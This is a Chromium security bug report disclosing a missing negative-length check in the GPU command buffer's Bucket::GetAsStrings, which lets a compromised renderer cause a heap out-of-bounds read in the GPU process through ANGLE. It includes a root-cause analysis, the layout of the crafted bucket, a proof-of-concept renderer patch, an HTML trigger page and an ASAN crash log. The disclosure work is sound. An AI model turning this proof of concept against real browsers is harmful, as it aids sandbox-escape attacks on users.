# OOB in GPU process: Missing negative length validation in Bucket::GetAsStrings.

| Field | Value |
|-------|-------|
| **Issue ID** | [487755344](https://issues.chromium.org/issues/487755344) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Internals>GPU>ANGLE |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | cw...@google.com |
| **Created** | 2026-02-26 |
| **Bounty** | $2,000.00 |

## Description

## Summary

The `Bucket::GetAsStrings` function in Chromium's GPU command buffer does not validate that per-string length values are non-negative. A compromised renderer process can construct a malicious bucket containing a negative length entry, which causes the function to compute an out-of-bounds string pointer. The passthrough command decoder forwards this pointer and the negative length directly to ANGLE's `gl::JoinShaderSources`, which interprets the negative length as "use strlen" per the OpenGL specification, resulting in a heap out-of-bounds read in the GPU process. This constitutes a sandbox escape from the renderer process to the GPU process.

## Root Cause

The vulnerability resides in `Bucket::GetAsStrings`, which unpacks a bucket containing multiple strings into separate pointer/length arrays. The bucket format consists of a header with a count field followed by per-string length values, then the NUL-terminated string data. The function uses `base::CheckedNumeric<size_t>` to track the running offset (`total_size`) into the bucket, but it never validates that individual length values are non-negative.

```
// gpu/command_buffer/service/common_decoder.cc
bool CommonDecoder::Bucket::GetAsStrings(
    GLsizei* _count, std::vector<char*>* _string, std::vector<GLint>* _length) {
  const size_t kMinBucketSize = sizeof(GLint);
  const size_t kMinStringSize = sizeof(GLint) + 1;
  const size_t bucket_size = this->size();
  if (bucket_size < kMinBucketSize) {
    return false;
  }
  char* bucket_data = this->GetDataAs<char*>(0, bucket_size);
  GLint* header = reinterpret_cast<GLint*>(bucket_data);
  GLsizei count = static_cast<GLsizei>(header[0]);
  if (count < 0) {
    return false;
  }
  const size_t max_count = (bucket_size - kMinBucketSize) / kMinStringSize;
  if (max_count < static_cast<size_t>(count)) {
    return false;
  }
  GLint* length = UNSAFE_TODO(header + 1);
  std::vector<char*> strs(count);
  base::CheckedNumeric<size_t> total_size = sizeof(GLint);
  total_size *= count + 1;  // Header size.
  if (!total_size.IsValid())
    return false;
  for (GLsizei ii = 0; ii < count; ++ii) {
    strs[ii] = bucket_data + total_size.ValueOrDefault(0);
    total_size += UNSAFE_TODO(length[ii]);     // negative value rolls back total_size
    total_size += 1;
    if (!total_size.IsValid() || total_size.ValueOrDefault(0) > bucket_size ||
        UNSAFE_TODO(strs[ii][length[ii]]) != 0) {  // negative offset checks inside bucket
      return false;
    }
  }
  if (total_size.ValueOrDefault(0) != bucket_size) {
    return false;
  }
  // ... outputs count, strs, length arrays
}

```

The critical missing check is `if (length[ii] < 0) return false;`. Without it, a negative `length[ii]` value triggers a chain of bypasses. When `length[ii]` is negative (e.g., -1), the `total_size += length[ii]` operation rolls back the running offset. Because `base::CheckedNumeric<size_t>` performs the addition in signed arithmetic before converting to `size_t`, a subtraction that yields a positive result (e.g., 14 + (-1) = 13) is considered valid. The NUL terminator check `strs[ii][length[ii]] != 0` uses the negative length as an array index, which accesses memory before the string pointer, landing on a known zero byte within the bucket. The final `total_size == bucket_size` check also passes because the negative length exactly cancels out the +1 for the NUL terminator.

The result is that `strs[1]` points to `bucket_data + bucket_size`, which is one byte past the end of the heap allocation. This pointer and the negative length are then passed through the passthrough command decoder without any additional validation.

```
error::Error GLES2DecoderPassthroughImpl::DoShaderSource(GLuint shader,
                                                         GLsizei count,
                                                         const char** string,
                                                         const GLint* length) {
  api()->glShaderSourceFn(GetShaderServiceID(shader, resources_), count, string,
                          length);
  return error::kNoError;
}

```

ANGLE's `gl::JoinShaderSources` receives the negative length and, following the OpenGL specification for `glShaderSource` where a negative length means "the string is NUL-terminated", calls `std::strlen` on the out-of-bounds pointer.

```
// third_party/angle/src/common/CompiledShaderState.cpp
std::string JoinShaderSources(GLsizei count, const char *const *string, const GLint *length)
{
    // ...
    for (GLsizei i = 0; i < count; ++i)
    {
        if (length == nullptr || length[i] < 0)
        {
            totalLength += std::strlen(string[i]);  // OOB read from string[1]
        }
        // ...
    }
    // ...
}

```

The client-side `PackStringsToBucket` function does sanitize negative lengths by converting them to `strlen` results before packing. However, this protection exists only in the renderer process. A compromised renderer can bypass `PackStringsToBucket` entirely and construct the bucket contents directly via `SetBucketSize` and `SetBucketData` command buffer commands, delivering the malicious payload to the GPU process.

## Reproduce

This vulnerability requires a compromised renderer (sandbox escape threat model). The PoC patches the renderer-side `ShaderSource` implementation to bypass `PackStringsToBucket` and directly construct a malicious bucket with a negative length entry. When the GPU process receives this bucket via the command buffer IPC, `Bucket::GetAsStrings` accepts it and passes the out-of-bounds pointer to ANGLE, triggering a heap OOB read.

The attack constructs a 14-byte bucket with the following layout:

```
Offset  Value         Description
[0-3]   2             count (GLint): two shader source strings
[4-7]   1             length[0] (GLint): first string is 1 byte
[8-11]  -1 (0xFFFFFFFF) length[1] (GLint): negative length triggers the bug
[12]    'A'           string 0 content
[13]    '\0'          string 0 NUL terminator

```

The validation in `GetAsStrings` proceeds as follows for this input. The `max_count` check passes: `(14 - 4) / 5 = 2 >= count(2)`. For `ii=0`: `strs[0] = data+12`, `total_size = 12+1+1 = 14`, `strs[0][1] = data[13] = 0` (NUL check passes). For `ii=1`: `strs[1] = data+14` (one byte past the heap allocation), `total_size = 14+(-1)+1 = 14`, `14 <= 14` (bounds check passes), `strs[1][-1] = data[13] = 0` (negative offset NUL check passes). The final check `total_size(14) == bucket_size(14)` also passes. The function returns `strs[1]` pointing to out-of-bounds memory and `length[1] = -1` to the caller.

Step 1: Apply the following patch to the renderer-side ShaderSource implementation. This simulates a compromised renderer that bypasses the normal `PackStringsToBucket` sanitization and directly constructs a malicious bucket.

```
diff --git a/gpu/command_buffer/client/gles2_implementation_impl_autogen.h b/gpu/command_buffer/client/gles2_implementation_impl_autogen.h
--- a/gpu/command_buffer/client/gles2_implementation_impl_autogen.h
+++ b/gpu/command_buffer/client/gles2_implementation_impl_autogen.h
@@ -1891,7 +1891,26 @@ void GLES2Implementation::ShaderSource(GLuint shader,
     return;
   }

-  if (!PackStringsToBucket(count, str, length, "glShaderSource")) {
+  // [PoC] Compromised renderer: craft malicious bucket with negative length
+  {
+    uint8_t malicious_bucket[14];
+    memset(malicious_bucket, 0, sizeof(malicious_bucket));
+    *reinterpret_cast<int32_t*>(&malicious_bucket[0]) = 2;    // count
+    *reinterpret_cast<int32_t*>(&malicious_bucket[4]) = 1;    // length[0]
+    *reinterpret_cast<int32_t*>(&malicious_bucket[8]) = -1;   // length[1]
+    malicious_bucket[12] = 'A';                                // string 0
+    malicious_bucket[13] = 0;                                  // NUL
+
+    helper_->SetBucketSize(kResultBucketId, sizeof(malicious_bucket));
+    helper_->SetBucketDataImmediate(kResultBucketId, 0, malicious_bucket,
+                                    sizeof(malicious_bucket));
+    helper_->ShaderSourceBucket(shader, kResultBucketId);
+    helper_->SetBucketSize(kResultBucketId, 0);
+    helper_->Flush();
+    LOG(ERROR) << "Malicious bucket sent to GPU process";
+    return;
+  }
+  if (!PackStringsToBucket(count, str, length, "glShaderSource")) {
     return;
   }
   helper_->ShaderSourceBucket(shader, kResultBucketId);

```

Step 2: Save the following HTML file as `poc.html`.

```
<!DOCTYPE html>
<html>
<head><title>PoC: Bucket::GetAsStrings negative length OOB</title></head>
<body>
<canvas id="c" width="1" height="1"></canvas>
<script>
const canvas = document.getElementById('c');
const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
if (!gl) {
  document.title = 'FAIL: no WebGL';
  throw new Error('WebGL not available');
}

const shader = gl.createShader(gl.VERTEX_SHADER);
gl.shaderSource(shader, "void main() { gl_Position = vec4(0); }");

document.title = 'DONE';
setTimeout(() => window.close(), 3000);
</script>
</body>
</html>

```

Step 3: Build and run with ASAN(I reproduced in MacOS Tahoe26.2).

```
autoninja -C out/asan chrome
./out/asan/Chromium.app/Contents/MacOS/Chromium --user-data-dir=./userdata poc.html

```

ASAN log:

```
==74608==ERROR: AddressSanitizer: use-after-poison on address 0x602000071e1e at pc 0x000104b86fbc bp 0x00016b540900 sp 0x00016b5400d0
READ of size 1 at 0x602000071e1e thread T0
==74608==WARNING: invalid path to external symbolizer!
==74608==WARNING: Failed to use and restart external symbolizer!
    #0 0x000104b86fb8 in __asan_after_dynamic_init+0x1854 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Helpers/Chromium Helper.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x16fb8)
    #1 0x000119af45c8 in gl::JoinShaderSources(int, char const* const*, int const*)+0x10c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Libraries/libGLESv2.dylib:arm64+0x16e85c8)
    #2 0x0001189d34ec in gl::Shader::setSource(gl::Context const*, int, char const* const*, int const*)+0x148 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Libraries/libGLESv2.dylib:arm64+0x5c74ec)
    #3 0x000361b88a70 in gpu::gles2::GLES2DecoderPassthroughImpl::DoShaderSource(unsigned int, int, char const**, int const*)+0xe4 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x18334a70)
    #4 0x000361bb5984 in gpu::gles2::GLES2DecoderPassthroughImpl::HandleShaderSourceBucket(unsigned int, void const volatile*)+0x1a8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x18361984)
    #5 0x000361bd5f24 in gpu::error::Error gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<false>(unsigned int, void const volatile*, int, int*)+0x1a4 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x18381f24)
    #6 0x0003515db2c4 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*)+0x4bc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7d872c4)
    #7 0x000361d034c4 in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&)+0x450 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x184af4c4)
    #8 0x000361d02644 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*)+0x468 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x184ae644)
    #9 0x000361d23f54 in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*)+0x290 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x184cff54)
    #10 0x000361d2fbf4 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&)+0x144 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x184dbbf4)
    #11 0x000361d2fa0c in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*)+0x118 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x184dba0c)
    #12 0x0003516140ec in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>)+0x1c8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7dc00ec)
    #13 0x0003515eebcc in gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>)+0x634 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7d9abcc)
    #14 0x0003515ed264 in gpu::Scheduler::RunNextTask()+0x27c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7d99264)
    #15 0x0003515f0600 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::Scheduler::*&&)(), gpu::Scheduler*>, base::internal::BindState<true, true, false, void (gpu::Scheduler::*)(), base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*)+0x184 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7d9c600)
    #16 0x00035bb8ef6c in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x348 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x1233af6c)
    #17 0x00035bbf7334 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x88c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x123a3334)
    #18 0x00035bbf66ec in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x123a26ec)
    #19 0x00035bd1656c in base::MessagePumpCFRunLoopBase::RunWork()+0x1c8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x124c256c)
    #20 0x00035bd07ca0 in base::apple::CallWithEHFrame(void () block_pointer)+0xc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x124b3ca0)
    #21 0x00035bd149a4 in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0xec (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x124c09a4)
    #22 0x00019b3549f4 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f9f4)
    #23 0x00019b354988 in __CFRunLoopDoSource0+0xa8 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f988)
    #24 0x00019b3546f4 in __CFRunLoopDoSources0+0xe4 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f6f4)
    #25 0x00019b353384 in __CFRunLoopRun+0x330 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5e384)
    #26 0x00019b40de30 in _CFRunLoopRunSpecificWithOptions+0x210 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x118e30)
    #27 0x00019d5a2960 in -[NSRunLoop(NSRunLoop) runMode:beforeDate:]+0xd0 (/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation:arm64e+0xa5b960)
    #28 0x00035bd176bc in base::MessagePumpNSRunLoop::DoRun(base::MessagePump::Delegate*)+0xc8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x124c36bc)
    #29 0x00035bd136fc in base::MessagePumpCFRunLoopBase::Run(base::MessagePump::Delegate*)+0x290 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x124bf6fc)
    #30 0x00035bbf8694 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x32c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x123a4694)
    #31 0x00035bb1d584 in base::RunLoop::Run(base::Location const&)+0x430 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x122c9584)
    #32 0x000364ea9958 in content::GpuMain(content::MainFunctionParams)+0x8b4 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x1b655958)
    #33 0x00035829a980 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*)+0x420 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0xea46980)
    #34 0x00035829cb00 in content::ContentMainRunnerImpl::Run()+0x53c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0xea48b00)
    #35 0x000358298670 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0x858 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0xea44670)
    #36 0x000358298b60 in content::ContentMain(content::ContentMainParams)+0x190 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0xea44b60)
    #37 0x000349859cb4 in ChromeMain+0x490 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x5cb4)
    #38 0x0001048bcce4 in main+0x254 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Helpers/Chromium Helper.app/Contents/MacOS/Chromium Helper:arm64+0x100000ce4)
    #39 0x00019aeedd50 in start+0x1c0c (/usr/lib/dyld:arm64e+0x8d50)

0x602000071e1e is located 0 bytes after 14-byte region [0x602000071e10,0x602000071e1e)
allocated by thread T0 here:
    #0 0x000104bc4db8 in __asan_memmove+0x2fd8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Helpers/Chromium Helper.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x54db8)
    #1 0x0003720e3b3c in operator new(unsigned long)+0x18 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x2888fb3c)
    #2 0x0003515e079c in gpu::CommonDecoder::HandleSetBucketSize(unsigned int, void const volatile*)+0xc0 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7d8c79c)
    #3 0x000361bd5f40 in gpu::error::Error gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<false>(unsigned int, void const volatile*, int, int*)+0x1c0 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x18381f40)
    #4 0x0003515db2c4 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*)+0x4bc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7d872c4)
    #5 0x000361d034c4 in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&)+0x450 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x184af4c4)
    #6 0x000361d02644 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*)+0x468 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x184ae644)
    #7 0x000361d23f54 in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*)+0x290 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x184cff54)
    #8 0x000361d2fbf4 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&)+0x144 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x184dbbf4)
    #9 0x000361d2fa0c in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*)+0x118 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x184dba0c)
    #10 0x0003516140ec in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>)+0x1c8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7dc00ec)
    #11 0x0003515eebcc in gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>)+0x634 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7d9abcc)
    #12 0x0003515ed264 in gpu::Scheduler::RunNextTask()+0x27c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7d99264)
    #13 0x0003515f0600 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::Scheduler::*&&)(), gpu::Scheduler*>, base::internal::BindState<true, true, false, void (gpu::Scheduler::*)(), base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*)+0x184 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7d9c600)
    #14 0x00035bb8ef6c in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x348 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x1233af6c)
    #15 0x00035bbf7334 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x88c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x123a3334)
    #16 0x00035bbf66ec in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x123a26ec)
    #17 0x00035bd1656c in base::MessagePumpCFRunLoopBase::RunWork()+0x1c8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x124c256c)
    #18 0x00035bd07ca0 in base::apple::CallWithEHFrame(void () block_pointer)+0xc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x124b3ca0)
